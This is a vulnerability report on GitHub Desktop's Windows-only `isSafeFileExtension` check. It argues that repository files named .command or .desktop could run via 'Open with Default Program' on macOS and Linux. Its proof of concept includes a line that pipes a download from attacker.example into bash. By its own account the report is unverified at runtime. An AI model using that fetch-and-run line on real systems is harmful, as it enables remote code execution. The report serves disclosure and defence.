## Title
Platform-scoped `isSafeFileExtension` allowlist permits unprivileged execution of attacker-controlled repo files via "Open with Default Program" - (File: app/src/ui/lib/context-menu.ts)

### Summary
The external report describes a smart contract that lacked an access-control check on a state-changing action (`Miner.mint`), letting an unprivileged caller trigger a privileged effect (minting NFTs it never paid for). The broken invariant is: *a sensitive operation was gated by a check that existed in name but did not actually enforce the intended restriction for the caller/asset in question.*

The Desktop analog is `isSafeFileExtension` in [1](#0-0)  — the function that is supposed to gate the "Open with Default Program" menu action so dangerous file types from a repository are not handed to the OS shell to execute. The guard only rejects `.cmd`, `.exe`, `.bat`, `.sh` and, critically, **only when `__WIN32__` is true**. On macOS and Linux the function unconditionally returns `true` for every extension, so the "safety" check is a no-op there.

### Finding Description
`RestrictedFileExtensions` and `isSafeFileExtension` are used across the UI (`filter-changes-list.tsx`, `selected-commits.tsx`, `copilot-conflicts-*`) to decide whether the `OpenWithDefaultProgramLabel` context-menu item is `enabled` for a file that is part of a changeset or commit — i.e., a file whose *content and name* came from a cloned/fetched/checked-out repository that may be attacker-controlled: [2](#0-1) [3](#0-2) 

When the item is clicked, `onOpenItem`/`openFile` calls `shell.openExternal('file://' + fullPath)`, i.e. it asks the OS to open the file the same way a Finder/Explorer double-click would: [4](#0-3) 

The only extension gate protecting this action is:
```
const RestrictedFileExtensions = ['.cmd', '.exe', '.bat', '.sh']
export function isSafeFileExtension(extension: string): boolean {
  if (__WIN32__) {
    return RestrictedFileExtensions.indexOf(extension.toLowerCase()) === -1
  }
  return true
}
``` [5](#0-4) 

On macOS, `open`/`shell.openExternal` on a `.command` file executes it directly in Terminal (this is standard macOS Finder behavior for `.command` scripts, and unlike files downloaded via a browser, files that arrive via `git clone`/`git pull` are not tagged with the `com.apple.quarantine` extended attribute, so Gatekeeper's "are you sure you want to open this" prompt for unidentified developers does not trigger). On Linux, `xdg-open`/`shell.openExternal` on a `.desktop` file can, on several desktop environments, execute the `Exec=` command it contains. On both platforms `isSafeFileExtension` returns `true` unconditionally, so the enabling logic in the context menu treats these as ordinary "safe" files and leaves "Open with Default Program" enabled.

### Impact Explanation
An attacker who controls a repository the victim clones, or who pushes a branch/PR the victim fetches, can commit a file named e.g. `setup.command` (macOS) or `update.desktop` (Linux) containing an arbitrary shell command. When the victim inspects the Changes/History view and chooses "Open with Default Program" (a normal, expected workflow for reviewing an unfamiliar file type), Desktop hands the file straight to the OS launcher with no extension-based warning — resulting in code execution outside of Desktop's own sandbox, on the attacker's timing, using only a single already-supported UI action. This matches the required impact class: attacker-controlled repository content → user performs a normal, expected action → arbitrary code execution.

### Likelihood Explanation
Likelihood is moderate-to-high on macOS/Linux: no admin rights, no pre-existing malware, and no unnatural user steps are required — reviewing changed/committed files and opening them with the default program is a core, documented Desktop workflow. The existing Windows-only guard proves the developers were aware that certain extensions should never be forwarded to the OS opener, but the mitigation was written as a platform-conditional allowlist rather than a cross-platform one, so the same class of file is fully unguarded on the other two supported platforms.

### Recommendation
Make `isSafeFileExtension` deny-list dangerous extensions on all platforms, not just Windows: include `.command`, `.desktop` (and other launcher-equivalent types such as `.app`/`.workflow` on macOS, `.AppImage`/`.desktop` on Linux) in the restricted set independent of `__WIN32__`, or invert the model to an explicit per-platform allowlist of known-safe document extensions rather than a Windows-only denylist.

### Proof of Concept
1. Attacker creates a public repository containing a file `run.command` with content:
   ```
   #!/bin/bash
   curl -s https://attacker.example/payload | bash
   ```
2. Victim, on macOS, clones the repo in GitHub Desktop (`git clone` — no quarantine attribute is applied, unlike browser downloads).
3. Victim opens History (or Changes, if the file is uncommitted) and right-clicks `run.command`.
4. Because `Path.extname('run.command')` is `.command`, which is not in `RestrictedFileExtensions` and `__WIN32__` is `false`, `isSafeFileExtension` returns `true`; "Open with Default Program" is `enabled: true` in the menu (`app/src/ui/history/selected-commits.tsx:417-420`, `app/src/ui/changes/filter-changes-list.tsx:796-799`).
5. Victim clicks the item → `onOpenItem` → `openFile` → `shell.openExternal('file://…/run.command')` → macOS Finder launches Terminal and executes the script, running the attacker's payload with the victim's OS user privileges.

*Note: I was not able to execute this end-to-end in a live macOS/Linux environment from the index alone; the conclusion that `.command`/`.desktop` files execute via `shell.openExternal`/`open`/`xdg-open` is based on documented OS behavior, not a runtime test in this sandbox. If a Devin session with a real macOS/Linux host is available, this PoC should be verified there.*

import { shell } from '../../lib/app-shell'
import { Dispatcher } from '../dispatcher'

export async function openFile(
  fullPath: string,
  dispatcher: Dispatcher
): Promise<void> {
  const result = await shell.openExternal(`file://${fullPath}`)

  if (!result) {
    const error = {
      name: 'no-external-program',
      message: `Unable to open file ${fullPath} in an external program. Please check you have a program associated with this file extension`,
    }
    await dispatcher.postError(error)
  }
}
